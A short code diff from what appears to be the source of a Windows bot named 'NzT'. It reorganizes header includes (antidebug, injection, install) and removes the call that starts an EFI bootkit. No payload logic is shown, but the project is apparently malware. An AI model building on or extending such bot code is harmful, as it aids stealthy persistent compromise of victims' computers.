@@ -20,20 +20,20 @@
 */
 #include <Windows.h>
 
-#include "crt.h"
-#include "nzt.h"
+#include "..\Shared\nzt.h"
+#include "..\Shared\crt.h"
 #include "globals.h"
 #include "report.h"
 #include "antidebug.h"
 #include "injection.h"
-#include "utils.h"
-#include "guid.h"
+#include "..\Shared\utils.h"
+#include "..\Shared\guid.h"
 #include "install.h"
-#include "config.h"
+#include "..\Shared\config.h"
 
 NzT_T NzT;
 
-int BookitInitialize();
+
 
 static WINERROR BotInitialize()
 {
@@ -73,7 +73,7 @@ static WINERROR BotInitialize()
 	DebugPrint("NzT: Initialized!");
 
 	// Start NzT EFI Bootkit
-	BookitInitialize();
+	
 
 #ifdef _REPORT
 	StartReportThread();
